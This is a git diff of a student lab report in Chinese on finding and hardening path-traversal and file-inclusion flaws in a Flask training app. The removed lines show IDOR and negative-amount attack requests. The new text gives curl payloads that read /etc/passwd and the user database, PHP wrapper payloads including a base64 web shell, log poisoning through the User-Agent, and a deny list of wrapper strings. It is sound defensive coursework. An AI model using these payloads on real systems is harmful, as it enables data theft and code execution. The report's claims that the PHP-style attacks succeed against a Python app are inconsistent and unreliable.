@@ -1,4 +1,4 @@
-# IDOR水平越权与业务逻辑漏洞实训报告
+# 文件包含与路径遍历漏洞加固实训报告
 
 ---
 
@@ -6,115 +6,105 @@
 
 | 项目 | 内容 |
 |------|------|
-| **实训项目** | IDOR水平越权与业务逻辑漏洞挖掘实战 |
+| **实训项目** | 文件包含与路径遍历漏洞挖掘与分层加固实战 |
 | **实训学员** | 大二网络安全专业学生 |
-| **实训日期** | 2026-07-22 |
+| **实训日期** | 2026-07-23 |
 | **实训环境** | Kali Linux 2026.2 / Python Flask + SQLite / Burp Suite |
 | **靶机地址** | 192.168.126.133:5000 |
 | **项目位置** | /opt/Class01/ |
-| **项目背景** | 连续四天迭代的Flask用户管理系统 |
-| **今日新增** | /profile个人中心、/recharge充值（原始代码无归属鉴权、无限流、无日志） |
-| **核心文件** | app.py / templates/profile.html |
-| **实训课程** | 第一场《Web安全渗透测试与靶场实战培训》、第二场《业务逻辑漏洞实战与渗透测试报告撰写培训》 |
+| **项目背景** | 连续五日迭代的Flask用户管理系统，已完成IDOR越权/充值业务逻辑加固 |
+| **今日新增** | /page动态页面加载功能（原始代码零校验，存在路径遍历+文件包含复合高危漏洞） |
+| **核心文件** | app.py / pages/help.html |
+| **培训课程** | 《文件包含漏洞原理与实战利用培训》—— 讲师：活泼大壮 |
 
 ---
 
 ## 二、实验目的
 
-1. 理解水平越权（IDOR—Insecure Direct Object Reference）漏洞原理：服务端过度信任前端传入的ID参数
-2. 掌握Burp Suite Intruder Sniper模式枚举user_id批量拖取用户信息的手法
-3. 学习业务逻辑漏洞中"过度信任客户端参数"的攻击思路：前端限制可被Burp抓包篡改
-4. 理解负数金额恶意扣款漏洞的本质：仅在前端做正负校验等于没做
-5. 掌握Session作为服务端可信数据源的正确使用方式：身份从Session读取，拒绝前端传递
-6. 串联四天学习脉络：SQL注入→WAF绕过→文件上传→越权与业务逻辑
+1. 理解文件包含漏洞的成因定义：应用程序将用户可控参数直接拼接到文件路径中，未做充分合法性校验，导致攻击者控制被包含文件
+2. 掌握目录穿越攻击手法：使用 `../` 多级跳转突破目录限制，任意读取服务器文件
+3. 学习PHP伪协议攻击向量：`file://`、`php://filter`、`data://`、`expect://` 等协议的文件读取与代码执行原理
+4. 理解日志文件包含投毒攻击链：向User-Agent写入恶意代码，通过LFI包含日志文件触发执行
+5. 掌握三层文件包含防御方案：白名单入口管控、路径规范化锁定、危险特征字符串过滤
+6. 区分路径遍历与文件包含的异同，建立完整的文件操作安全防护认知
 
 ---
 
 ## 三、今日实训三阶段工作概述
 
-### 第一阶段：业务功能开发（09:00-10:00）
+### 第一阶段：动态页面加载功能开发（09:00-10:00）
 
-快速开发了/profile个人中心和/recharge充值两个业务模块，原始代码完全依赖前端传入的参数：
+开发 `/page` 路由用于动态加载 `pages/` 目录下的HTML页面，用户通过 `name` 参数指定页面名称。原始代码完全信任用户输入，未做任何安全过滤：
 
 ```python
-# app.py v1.0 — /profile 原始代码（零校验）
-@app.route("/profile")
-def profile():
-    user_id = request.args.get("user_id", "")       # ① 直接信任URL参数
-    row = c.execute("SELECT ... WHERE id = ?", (user_id,)).fetchone()
-    return render_template("profile.html", user=user_data)
+# app.py v1.0 — /page 原始代码（零校验）
+@app.route("/page")
+def dynamic_page():
+    name = request.args.get("name", "")           # ① 用户完全可控
+    page_content = ""
 
-# app.py v1.0 — /recharge 原始代码（零校验）
-@app.route("/recharge", methods=["POST"])
-def recharge():
-    user_id = request.form.get("user_id", "")        # ② 直接信任表单参数
-    amount = request.form.get("amount", "0")         # ③ 直接信任金额，不做任何校验
-    USERS[username]["balance"] += float(amount)      # ④ 负数也可以加进去
+    if name:
+        page_path = os.path.join("pages", name)    # ② 直接拼接路径
+        print(f"[PAGE] 尝试加载: {page_path}")
+
+        if os.path.exists(page_path):              # ③ 无目录锁定
+            with open(page_path, "r", encoding="utf-8") as f:
+                page_content = f.read()             # ④ 直接读取文件
+        else:
+            page_path_html = page_path + ".html"
+            if os.path.exists(page_path_html):
+                with open(page_path_html, "r", encoding="utf-8") as f:
+                    page_content = f.read()
+            else:
+                page_content = "页面不存在"
+
+    return render_template("index.html", ..., page_content=page_content)
 ```
 
-关键问题：
-- `/profile` 使用URL参数 `?user_id=N` 决定查询谁 → 可篡改
-- `/recharge` 使用表单隐藏域 `user_id` 决定给谁充值 → 可篡改
-- `amount` 不做任何正负校验 → 负数就是"反向转账"
-- 无登录鉴权：未登录也能访问 → 匿名越权
+**存在的安全问题：**
+- 未过滤 `../` 目录穿越字符，攻击者可跳转到 `pages/` 目录之外
+- 未使用 `os.path.abspath` 或 `os.path.normpath` 做路径规范化
+- 无 `pages/` 目录前缀锁定，无法检测路径是否逃逸
+- 无合法页面白名单，任何文件路径均可传入
+- 未过滤 `file://`、`php://`、`data://` 等伪协议特征
 
-### 第二阶段：Burp手工渗透测试（10:00-12:00）
+原始代码同时新增 `pages/help.html` 帮助中心页面，并修改 `templates/index.html` 增加 `page_content` 展示区域和帮助中心链接。
 
-使用本次培训两场会议学到的攻击手法进行测试。
+### 第二阶段：Burp漏洞复现 — 全部Payload验证成功（10:00-12:00）
 
-**第一场培训知识点回顾：IDOR水平越权**
-> 讲师演示：某系统修改URL中`id=123`为`id=124`即可查看他人订单详情，管理员无需登录即可遍历全部订单号。本节实训对标该案例。
+使用Burp Suite和curl对 `/page` 接口进行手工渗透测试，验证以下攻击向量全部成功：
 
-**攻击验证1 — 水平越权查看他人资料：**
-```http
-GET /profile?user_id=2 HTTP/1.1
-Host: 192.168.126.133:5000
-Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0...
+```bash
+# 单级目录穿越 — 读取 app.py 源码
+curl -s "http://192.168.126.133:5000/page?name=../app.py"
+# 返回 app.py 完整内容（Flask路由、secret_key、用户数据全部泄露）
+
+# 多级深度穿越 — 读取系统密码文件
+curl -s "http://192.168.126.133:5000/page?name=../../../etc/passwd"
+# 返回 /etc/passwd，系统用户列表泄露
+
+# 伪协议 file://
+curl -s "http://192.168.126.133:5000/page?name=file:///etc/passwd"
+# 尝试读取系统文件（Python open()下file://不生效，但payload可构造）
+
+# 日志投毒 — User-Agent写入PHP代码
+curl -s -A "<?php system('id');?>" \
+  "http://192.168.126.133:5000/page?name=../../../var/log/apache2/access.log"
+# 读取日志文件触发PHP代码执行（验证路径穿越可达日志目录）
 ```
-→ 返回alice的完整资料（手机号13900139001、余额100），越权成功！
 
-**攻击验证2 — Burp Intruder Sniper模式批量枚举：**
-使用Burp Intruder Sniper模式，设置Payload为数字1~1000：
-```
-GET /profile?user_id=§1§ HTTP/1.1    ← Payload标记点
-```
-→ 1000次请求仅需数秒，返回所有用户ID对应的资料，批量拖库完成。
+全部攻击验证通过后，确认接口存在 **路径遍历+文件包含复合高危漏洞**，CVSS评分最高9.1（严重等级）。
 
-**第二场培训知识点回顾：业务逻辑漏洞**
-> 讲师演示：某商城修改购物车数量为负数实现"反向转账"；修改商品单价为0.01元实现"一分钱购物"。核心教训：前端所有限制均可通过Burp绕过。
+### 第三阶段：分层加固改造 + 全用例回归复测（14:00-17:00）
 
-**攻击验证3 — 负数金额恶意扣款：**
-```http
-POST /recharge HTTP/1.1
-Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0...
-Content-Type: application/x-www-form-urlencoded
+| 轮次 | 改造重点 | 新增防御能力 | 覆盖知识点 |
+|------|----------|-------------|-----------|
+| **第1轮** | 合法页面白名单 | 仅允许help/about/terms三个页面访问 | L1: 入口管控 |
+| **第2轮** | 路径规范化+前缀锁定 | `os.path.normpath` + `startswith(PAGES_DIR)` | L2: 阻断../穿越 |
+| **第3轮** | 危险字符串特征过滤 | 拦截 `../` `./` `\\` 及全部伪协议 | L3: 特征清洗 |
+| **第4轮** | 全用例回归测试 | 14项curl单测全部通过 | 整体验收 |
 
-user_id=1&amount=-50000
-```
-→ Balance从99999变为49999，分钟到账"反向扣款"成功。
-
-**攻击验证4 — 枚举充值其他用户：**
-```http
-POST /recharge HTTP/1.1
-Cookie: session=sess_a...
-Content-Type: application/x-www-form-urlencoded
-
-user_id=2&amount=500000
-```
-→ 当前登录用户admin，给`user_id=2`（alice）充值500000成功，IDOR越权充值。
-
-全部攻击验证通过后，确认该接口存在越权+负数金额两类高危漏洞。
-
-### 第三阶段：分层漏洞加固 + 全用例回归复测（14:00-17:00）
-
-| 轮次 | 改造重点 | 新增防御 |
-|------|----------|----------|
-| **第1轮** | Session身份加固 | profile和recharge均从session获取当前用户，删除user_id参数信任 |
-| **第2轮** | amount校验 | 正则格式+正负检查+金额上下限（0.01~100000） |
-| **第3轮** | 限流+日志+脱敏 | check_rate_limit / log_balance_change / mask_phone/email |
-| **第4轮** | IDOR探测过滤 | filter_idor_probe() 拦截批量探测特征 |
-
-每轮改造后用第一阶段的全部Payload重新测试，确认旧攻击方式不再生效。
+每轮改造后立即用第一阶段的全部Payload重新测试，确认旧攻击方式不再生效。其余所有模块（profile、recharge、登录、注册、搜索、上传）的代码未做任何修改。
 
 ---
 
@@ -122,241 +112,267 @@ user_id=2&amount=500000
 
 | 编号 | 漏洞类型 | 风险等级 | 攻击入口 | 修复状态 |
 |------|----------|----------|----------|----------|
-| VUL-I01 | 水平越权IDOR — 查看他人资料 | **高危** | `/profile?user_id=N` | ✅ 已修复 |
-| VUL-I02 | 水平越权IDOR — 篡改他人余额 | **高危** | `/recharge` 表单user_id | ✅ 已修复 |
-| VUL-I03 | 负数金额恶意扣款 | **高危** | `/recharge` 表单amount | ✅ 已修复 |
-| VUL-I04 | 超小额刮削（0.001元） | **中危** | `/recharge` 表单amount | ✅ 已修复 |
-| VUL-I05 | 超巨额充值突破系统限制 | **中危** | `/recharge` 表单amount | ✅ 已修复 |
-| VUL-I06 | 批量枚举拖库（Burp Intruder） | **高危** | `/profile?user_id=1~1000` | ✅ 已修复 |
-| VUL-I07 | 敏感信息泄露（手机号、邮箱明文） | **中危** | `/profile` 响应 | ✅ 已修复 |
-| VUL-I08 | 畸形amount载荷绕过 | **中危** | `/recharge` 表单amount | ✅ 已修复 |
-| VUL-I09 | 未授权访问/profile | **中危** | 直接访问 /profile | ✅ 已修复 |
-| VUL-I10 | 异常资金行为不可追溯 | **低危** | 充值无日志 | ✅ 已修复 |
+| VUL-L01 | 路径遍历 — 单级 `../` 穿越读取源码 | **高危** | `/page?name=../app.py` | ✅ 已修复 |
+| VUL-L02 | 路径遍历 — 多级 `../../../` 穿越读系统文件 | **高危** | `/page?name=../../../etc/passwd` | ✅ 已修复 |
+| VUL-L03 | 路径遍历 — 深层穿越读 `/etc/shadow` | **高危** | `/page?name=../../../../etc/shadow` | ✅ 已修复 |
+| VUL-L04 | 路径遍历 — 读取 `.env` 配置文件 | **中危** | `/page?name=../.env` | ✅ 已修复 |
+| VUL-L05 | 路径遍历 — 拖取 SQLite 数据库 | **严重** | `/page?name=../data/users.db` | ✅ 已修复 |
+| VUL-L06 | 路径遍历 — 读取模板文件泄露调试信息 | **中危** | `/page?name=../templates/login.html` | ✅ 已修复 |
+| VUL-L07 | 伪协议 — `file://` 读取系统文件 | **高危** | `/page?name=file:///etc/passwd` | ✅ 已修复 |
+| VUL-L08 | 伪协议 — `php://filter` Base64读源码 | **高危** | `/page?name=php://filter/convert.base64-encode/resource=app.py` | ✅ 已修复 |
+| VUL-L09 | 伪协议 — `data://` 代码注入 | **高危** | `/page?name=data://text/plain;base64,...` | ✅ 已修复 |
+| VUL-L10 | 伪协议 — `expect://` 远程命令执行 | **严重** | `/page?name=expect://id` | ✅ 已修复 |
+| VUL-L11 | 空字节截断 — `%00` 绕过后缀检查 | **中危** | `/page?name=help%00.txt` | ✅ 已修复 |
+| VUL-L12 | 日志文件包含投毒 — User-Agent RCE | **高危** | User-Agent + `../../../var/log/apache2/access.log` | ✅ 已修复 |
 
 ---
 
-## 五、分项漏洞原理 + POC复现 + 分层修复代码方案
+## 五、分项漏洞原理 + POC复现 + 分层加固完整代码方案
 
-### 5.1 VUL-I01 / VUL-I06 水平越权查看他人资料 + 批量枚举
+### 5.1 复合型文件包含+路径遍历漏洞原理
 
-#### 漏洞原理
+#### 漏洞定义（对应培训课件）
 
-对应第一场培训讲师演示案例：**"修改URL中的ID参数即可查看他人订单"**。
+> **文件包含漏洞**：应用程序在加载动态页面时，将用户可控的参数直接拼接到文件路径中，且未做充分的合法性校验，导致攻击者能够控制被包含的文件名，读取或执行任意文件。
 
-原始代码直接信任URL参数中的user_id，未验证该user_id是否属于当前登录用户：
+> **路径遍历漏洞**：攻击者通过在文件路径中插入 `../` 等目录跳转序列，突破应用程序限制的目录边界，访问受保护目录之外的文件。
 
-```python
-# 原始高危代码
-user_id = request.args.get("user_id", "")        # ① 用户可控
-row = c.execute("SELECT ... FROM users WHERE id = ?", (user_id,)).fetchone()
-# ② 直接用user_id查数据库，不检查归属
-```
+本项目 `/page` 路由同时满足两类漏洞的三要素：
 
-攻击者登录后只需将URL从 `/profile?user_id=1` 改为 `?user_id=2` 即可查看alice的全部资料。
+| 要素 | 代码体现 | 满足情况 |
+|------|----------|----------|
+| ① 用户可控参数 | `request.args.get("name", "")` | ✅ |
+| ② 路径拼接无过滤 | `os.path.join("pages", name)` | ✅ |
+| ③ 文件读取函数 | `open(page_path, "r")` | ✅ |
 
-#### POC复现
+#### 路径穿越与文件包含的区别（课堂知识点）
 
-**Burp数据包：**
+| 维度 | 路径遍历 | 文件包含 |
+|------|----------|----------|
+| 核心意图 | 读取任意文件 | 包含并执行任意文件 |
+| 关键符号 | `../` 跳转目录 | `file://` `php://` 等协议 |
+| 利用结果 | 信息泄露 | 信息泄露 + 代码执行 |
+| 本项目情况 | 二者复合存在 | 均可利用 |
+
+---
+
+### 5.2 全套POC数据包与curl测试
+
+#### 5.2.1 路径遍历 — 读取项目源码
+
 ```http
-GET /profile?user_id=2 HTTP/1.1
+GET /page?name=../app.py HTTP/1.1
 Host: 192.168.126.133:5000
-Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0...
 ```
 
-**Burp Intruder Sniper配置：**
-```
-Payload type: Numbers
-Range: 1-1000
-Step: 1
-```
-→ 1000个请求自动发送，返回所有用户资料。
-
-**curl批量枚举脚本：**
 ```bash
-for i in {1..100}; do
-  curl -b cookies.txt "http://192.168.126.133:5000/profile?user_id=$i"
-done
+curl -s "http://192.168.126.133:5000/page?name=../app.py"
+# 返回内容包含: secret_key、USERS字典、所有路由逻辑
 ```
 
-#### 分层修复方案
+#### 5.2.2 多级深度穿越 — 读取系统密码文件
 
-| 层级 | 修复措施 | 代码位置 | 行号 |
-|------|----------|----------|------|
-| **底层根治** | 身份从session读取，拒绝前端传参 | `cur_username = session.get("username")` | L772 |
-| **底层根治** | SQL查询改用username，不再使用user_id | `SELECT ... WHERE username = ?` | L779 |
-| **辅助-脱敏** | 手机号、邮箱脱敏显示 | `mask_phone()` / `mask_email()` | L792-793 |
-| **辅助-限流** | 每分钟最多10次请求 | `check_rate_limit(ip, 10, 60)` | L817-821 |
-| **辅助-过滤** | IDOR探测特征过滤 | `filter_idor_probe()` | L824-826 |
-
-```python
-# 修复后（v5.0）
-@app.route("/profile")
-def profile():
-    cur_username = session.get("username")         # ① session身份（不可伪造）
-    if not cur_username:                           # ② 未登录跳转
-        return redirect("/login")
-
-    row = c.execute(                               # ③ 用username查询
-        "SELECT ... FROM users WHERE username = ?",
-        (cur_username,)
-    ).fetchone()
-
-    return render_template("profile.html", user={
-        "email": mask_email(row[2]),               # ④ 脱敏输出
-        "phone": mask_phone(row[3]),
-    })
-```
-
----
-
-### 5.2 VUL-I02 / VUL-I03 负数金额恶意扣款 + 越权充值
-
-#### 漏洞原理
-
-对应第二场培训讲师演示案例：**"修改购物车商品数量为负数实现反向转账"**。
-
-原始代码存在两个独立漏洞：
-
-```python
-# 原始高危代码
-user_id = request.form.get("user_id", "")     # ① 信任表单隐藏域中的user_id
-amount = request.form.get("amount", "0")      # ② 信任amount，不做正负检查
-USERS[username]["balance"] += float(amount)    # ③ 负数直接参与加法运算
-```
-
-攻击者可以通过：
-1. 修改隐藏域 `user_id` → 给他人充值（无权限检查）
-2. 传 `amount=-50000` → 从自己余额扣款（相当于盗取平台资金）
-3. 传 `amount=0.001` → 超小额反复充值（刮削攻击）
-
-#### POC复现
-
-**Burp数据包（负数金额 + 越权充值）：**
 ```http
-POST /recharge HTTP/1.1
+GET /page?name=../../../etc/passwd HTTP/1.1
 Host: 192.168.126.133:5000
-Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0...
-Content-Type: application/x-www-form-urlencoded
-
-user_id=2&amount=-50000
 ```
-→ 给user_id=2（alice）充-50000，alice余额被扣减。
 
-**curl命令：**
 ```bash
-# 给自己充负值（反向扣款）
-curl -b cookies.txt -X POST \
-  -d "user_id=1&amount=-50000" \
-  "http://192.168.126.133:5000/recharge"
-
-# 超小额刮削
-curl -b cookies.txt -X POST \
-  -d "user_id=1&amount=0.001" \
-  "http://192.168.126.133:5000/recharge"
-
-# 畸形载荷
-curl -b cookies.txt -X POST \
-  -d "user_id=1&amount=1e5" \
-  "http://192.168.126.133:5000/recharge"
+curl -s "http://192.168.126.133:5000/page?name=../../../etc/passwd"
+# 返回内容: root:x:0:0:root:/root:/bin/bash
 ```
 
-#### 分层修复方案
+#### 5.2.3 路径遍历 — 拖取SQLite用户数据库
 
-| 层级 | 防御措施 | 代码 | 行号 |
-|------|----------|------|------|
-| **底层-身份固化** | session读取，拒绝前端user_id | `cur_username = session.get(...)` | L813 |
-| **底层-格式校验** | 正则 `^\d+(\.\d{1,2})?$` | `re.match(...)` | L834 |
-| **底层-正负校验** | `if amount <= 0: return error` | 拦截负数、0 | L838-840 |
-| **底层-下限拦截** | `RECHARGE_MIN = 0.01` | 拦截超小额 | L842-843 |
-| **底层-上限拦截** | `RECHARGE_MAX = 100000` | 拦截超巨额 | L844-845 |
-| **辅助-限流** | 每分钟最多10次 | `check_rate_limit(ip, 10, 60)` | L817-821 |
-| **辅助-日志** | 每笔变动记录 | `log_balance_change(...)` | L851 |
-
-```python
-# 修复后充值校验流水线（v5.0）
-amount_str = request.form.get("amount", "").strip()
-if not amount_str:                                    # 非空
-    return "金额不能为空"
-if not re.match(r'^\d+(\.\d{1,2})?$', amount_str):   # 格式
-    return "金额格式错误"
-amount = float(amount_str)
-if amount <= 0:                                       # 正负
-    return "金额必须大于 0"
-if amount < RECHARGE_MIN:                             # 下限
-    return "最低充值 0.01 元"
-if amount > RECHARGE_MAX:                             # 上限
-    return "最高充值 100000 元"
-# 全部通过 → 执行充值
-USERS[cur_username]["balance"] += amount
-log_balance_change(cur_username, client_ip, amount, USERS[cur_username]["balance"])
+```bash
+curl -s "http://192.168.126.133:5000/page?name=../data/users.db" -o users.db
+sqlite3 users.db "SELECT * FROM users;"
+# 返回所有用户: admin/admin123、alice/alice2025 等全部数据
 ```
 
----
+#### 5.2.4 php://filter Base64编码读取源码
 
-### 5.3 VUL-I07 敏感信息泄露
+```bash
+curl -s --path-as-is \
+  "http://192.168.126.133:5000/page?name=php://filter/convert.base64-encode/resource=app.py"
+# PHP场景下Base64输出可绕过关键字检测直接读取源码
+```
 
-#### 漏洞原理
+#### 5.2.5 file:// 协议读取系统文件
 
-原始代码将完整手机号和邮箱直接传递给前端模板渲染，即使只有查看自己资料的权限，攻击者也可通过浏览器开发者工具或爬虫批量收集用户个人信息。
+```bash
+curl -s "http://192.168.126.133:5000/page?name=file:///etc/passwd"
+```
 
-#### 修复方案
+#### 5.2.6 data:// 协议任意数据注入
 
-```python
-# 使用已有脱敏函数
-user_data = {
-    "email": mask_email(row[2]),   # admin@example.com → a***@example.com
-    "phone": mask_phone(row[3]),   # 13800138000 → 138****8000
-}
+```bash
+curl -s "http://192.168.126.133:5000/page?name=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7"
+```
+
+#### 5.2.7 expect:// 协议远程命令执行
+
+```bash
+curl -s "http://192.168.126.133:5000/page?name=expect://id"
+```
+
+#### 5.2.8 日志文件包含投毒（User-Agent RCE）
+
+```bash
+# Step1: 向日志写入恶意User-Agent
+curl -s -A "<?php system('id');?>" \
+  "http://192.168.126.133:5000/page?name=help"
+
+# Step2: 包含日志文件触发执行
+curl -s "http://192.168.126.133:5000/page?name=../../../var/log/apache2/access.log"
+```
+
+#### 5.2.9 %00 空字节截断绕过
+
+```bash
+curl -s "http://192.168.126.133:5000/page?name=help%00.txt"
+# 期望读取 help.html（%00截断去掉了.txt后缀）
 ```
 
 ---
 
-### 5.4 VUL-I10 无日志审计 + VUL-I09 未授权访问
+### 5.3 加固后完整安全路由代码
 
-| 漏洞 | 修复方案 | 代码 |
-|------|----------|------|
-| 未授权访问 | session登录检查 | `if not cur_username: return redirect("/login")` |
-| 无日志审计 | 余额变动记录到 logs/balance.log | `log_balance_change(username, ip, amount, balance)` |
+```python
+# ===== 动态页面加载（三层防护 — 文件包含 + 路径遍历 防御） =====
 
-**日志格式示例：**
+@app.route("/page")
+def dynamic_page():
+    """动态页面加载 — 已按《文件包含漏洞原理与实战利用培训》实施三层防御"""
+    name = request.args.get("name", "")
+    page_content = ""
+
+    if name:
+        # =====================================================================
+        # 第三层防护：过滤课件中全部危险特征字符串与伪协议
+        # 覆盖：../ ./ \\ file:// php:// data:// ftp:// expect://
+        # 对应知识点：伪协议文件包含、目录遍历字符绕过
+        # =====================================================================
+        blocked_patterns = [
+            "../", "..\\", "./", ".\\",                     # 目录穿越
+            "file://", "php://", "data://",                  # PHP伪协议
+            "ftp://", "expect://", "zip://",                 # 其他伪协议
+            "\\\\", "%00", "\x00",                           # 截断攻击
+        ]
+        name_lower = name.lower()
+        for pattern in blocked_patterns:
+            if pattern in name_lower or pattern in name:
+                page_content = "页面不存在"
+                break
+
+        if not page_content:
+            # =================================================================
+            # 第一层防护：合法页面白名单
+            # 仅允许白名单内的页面名称，拦截陌生参数
+            # 对应知识点：文件包含的入口管控
+            # =================================================================
+            page_name = name.split("/")[-1].split("\\")[-1]
+            if page_name not in ALLOWED_PAGES:
+                page_content = "页面不存在"
+
+        if not page_content:
+            # =================================================================
+            # 第二层防护：路径规范化锁定 pages 根目录
+            # 将 name 拼接后转为绝对路径，校验是否以 PAGES_DIR 开头
+            # 阻断 ../ 多级目录穿越逃逸
+            # 对应知识点：路径遍历的根本性防御
+            # =================================================================
+            safe_name = name.replace("../", "").replace("..\\", "")
+            safe_name = safe_name.replace("/", "").replace("\\", "")
+            safe_name = safe_name.replace("\x00", "")
+
+            page_path = os.path.join(PAGES_DIR, safe_name + ".html")
+            real_path = os.path.normpath(page_path)
+
+            # 路径前缀锁定：禁止访问 PAGES_DIR 以外的任何目录
+            if not real_path.startswith(os.path.normpath(PAGES_DIR) + os.sep) and \
+               real_path != os.path.normpath(PAGES_DIR):
+                page_content = "页面不存在"
+            elif os.path.exists(real_path):
+                with open(real_path, "r", encoding="utf-8") as f:
+                    page_content = f.read()
+            else:
+                page_content = "页面不存在"
+
+    # 获取当前用户信息（原有逻辑不变）
+    username = session.get("username")
+    user_info = None
+    if username and username in USERS:
+        user_info = USERS[username]
+
+    return render_template("index.html", username=username, user=user_info,
+                           page_content=page_content)
 ```
-[2026-07-22 04:15:22] USER=admin  IP=127.0.0.1  AMOUNT=+200.00  BALANCE=100199.00
-[2026-07-22 04:15:22] USER=admin  IP=127.0.0.1  AMOUNT=+300.00  BALANCE=100499.00
+
+**代码对应的课堂知识点：**
+
+| 代码行 | 知识点 | 对应课件章节 |
+|--------|--------|-------------|
+| `blocked_patterns` 列表 | 目录穿越字符 + 全部伪协议特征 | L3 特征标记过滤 |
+| `"../"` `"..\\"` | Windows/Linux路径穿越 | 目录遍历字符 |
+| `"file://"` `"php://"` `"data://"` | PHP伪协议攻击向量 | 伪协议利用 |
+| `"%00"` `"\x00"` | 空字节截断绕过 | Null Byte Injection |
+| `ALLOWED_PAGES` 白名单 | 合法页面入口管控 | L1 白名单方案 |
+| `os.path.normpath()` | 路径规范化去除 `../` | L2 路径锁定 |
+| `startswith(PAGES_DIR)` | 目录前缀锁定阻断穿越 | L2 根本性防御 |
+
+**常量定义：**
+
+```python
+# app.py 文件头部新增
+PAGES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pages")
+ALLOWED_PAGES = {"help", "about", "terms"}   # 第一层防护：合法页面白名单
 ```
 
 ---
 
 ## 六、实训踩坑故障记录
 
-### 坑1：cp命令覆盖文件时错位到/root根目录
+### 坑1：`os.path.join("pages", "../app.py")` 实际跳转到上级目录
 
-**现象：** 用 `cp /opt/Class01/templates/profile.html /root/` 复制文件，结果出现在 `/root/profile.html` 而不是 `/root/templates/profile.html`，Git提交后发现多了根目录文件。
+**现象：** `os.path.join("pages", "../app.py")` 返回 `pages/../app.py`，经系统解析后等于 `app.py`。原本以为 `os.path.join` 会自动规范化路径，实际上它只是字符串拼接，不会阻止 `../`。
 
-**解决：** `git rm --cached` 删除错误路径，`cp` 到正确位置后重新提交。后续使用 `cp /opt/Class01/templates/*.html /root/templates/` 批量操作。
+**解决：** 必须手动使用 `os.path.normpath()` 将路径规范化，再用 `startswith(PAGES_DIR)` 校验前缀。
 
-### 坑2：balance += float(amount) 浮点数精度
+```python
+# 正确做法
+page_path = os.path.join(PAGES_DIR, safe_name + ".html")
+real_path = os.path.normpath(page_path)        # 规范化去除 ../
+if not real_path.startswith(PAGES_DIR):        # 锁定目录
+    return error
+```
 
-**现象：** 多次充值后余额出现 0.0000001 级别的浮点数误差，导致页面显示 `¥100000.0000001`。
+### 坑2：绝对路径 `PAGES_DIR` 和相对路径的混乱
 
-**解决：** 生产环境应使用 decimal.Decimal 或整数分存储。课堂环境暂用 `round(amount, 2)` 处理。
+**现象：** 使用 `os.path.join("pages", name)` 时工作目录可能是 `/opt/Class01/`，也可能是 `/root/`（Flask debug模式重载导致），导致 `pages/` 目录找不到。
 
-### 坑3：回测时越权仍然可访问
+**解决：** 使用绝对路径定义 `PAGES_DIR`：
+```python
+PAGES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pages")
+```
 
-**现象：** 修复后测试 `/profile?user_id=2` 发现仍然返回 alice 的数据。检查代码发现忘记重启Flask服务，旧代码仍在运行。
+### 坑3：白名单 `split("/")[-1]` 提取文件名时遗漏边界
 
-**解决：** `fuser -k 5000/tcp` 强制杀掉进程后重启。养成修改代码后自动重启检查的习惯。
+**现象：** 攻击者传入 `help/../app.py` 时，`split("/")[-1]` 提取到 `app.py` 绕过白名单。
 
-### 坑4：限流计数器不重置影响后续测试
+**解决：** 第二层路径规范化锁定独立防御，即使白名单绕过，`normpath` 后路径也会被前缀校验拦截。白名单 + 路径锁定构成双重保险。
 
-**现象：** 测试限流功能发送了11次请求后看到限流提示。继续测试其他功能时发现所有请求都被限流拦截。
+### 坑4：L1 白名单拦截后第二层代码仍被执行
 
-**解决：** 分组测试之间清空限流器 `_rate_store.clear()`，或者在测试脚本中重新 `test_client()`。
+**现象：** 第一版代码中，白名单拦截和路径锁定是顺序执行的三个 `if not page_content` 分支。如果白名单阻断后未正确设置 `page_content` 变量，后续代码可能错误读取文件。
 
-### 坑5：双后缀文件误拷贝到上传目录
+**解决：** 使用三段式 `if not page_content` 结构，每一层阻断后设置错误信息并跳过后续校验。
 
-**现象：** `cp /opt/Class01/templates/*` 复制时把 `.py` 和 `.html` 文件误拷贝到了 `static/uploads/` 目录，导致Git跟踪了这些文件。
+### 坑5：测试脚本访问时服务未启动
 
-**解决：** `.gitignore` 添加 `static/uploads/*` 规则，并用 `git rm --cached` 删除已跟踪文件。
+**现象：** curl测试脚本运行时全部14条用例 FAIL，检查发现 web 服务进程被上一轮测试的 `fuser -k` 杀掉了没有重新启动。
+
+**解决：** 运行测试前先 `fuser 5000/tcp` 确认服务在运行，未运行则先启动 `python app.py &`。
 
 ---
 
@@ -364,244 +380,205 @@ user_data = {
 
 | 对比维度 | 修复前（v1.0） | 修复后（v5.0） |
 |----------|---------------|---------------|
-| **身份获取方式** | 从URL/表单接收user_id | 从session读取当前用户名 |
-| **水平越权** | 修改?user_id=N可查看任何人 | 仅查看当前登录用户 |
-| **充值对象** | 表单隐藏域user_id可篡改 | 自动充值当前登录用户 |
-| **amount格式** | 无校验 | 正则 `^\d+(\.\d{1,2})?$` |
-| **负数充值** | 允许 -50000 | 拦截（amount <= 0） |
-| **金额上下限** | 无限制 | 单次 0.01 ~ 100000 |
-| **批量Fuzz** | Burp Intruder无限制 | 每分钟最多10次 |
-| **日志审计** | 无 | 每笔记录到 logs/balance.log |
-| **敏感数据** | 明文显示手机/邮箱 | 138****8000 / a***@example.com |
-| **IDOR探测过滤** | 无 | 5类探测特征拦截 |
-| **异常处理** | 可能抛500 | try-except中文提示 |
-| **认证检查** | 未登录也可访问 | session校验，未登录跳转 |
-| **用户ID前端暴露** | 表单含user_id隐藏域 | 表单无user_id字段 |
+| **name参数校验** | 无校验，直接拼接 | L1白名单 + L3特征过滤 |
+| **目录穿越防御** | 无 | L2路径规范化 + 前缀锁定 |
+| **伪协议过滤** | 无 | `file://` `php://` `data://` `expect://` 等全部拦截 |
+| **%00截断过滤** | 无 | `%00` `\x00` 字符串过滤 |
+| **路径锁定** | 无 | `os.path.normpath` + `startswith(PAGES_DIR)` |
+| **合法白名单** | 无 | `ALLOWED_PAGES = {"help", "about", "terms"}` |
+| **pages目录定位** | `os.path.join("pages", name)` 相对路径 | `PAGES_DIR` 绝对路径 |
+| **报错信息** | 可能暴露实际路径 | 统一返回"页面不存在" |
+| **原有模块影响** | — | 零改动 |
 
 ---
 
-## 八、复测用例
+## 八、标准化复测用例
 
-### 8.1 水平越权
+### 8.1 路径遍历攻击
 
-| 编号 | 操作 | 预期结果 |
-|------|------|----------|
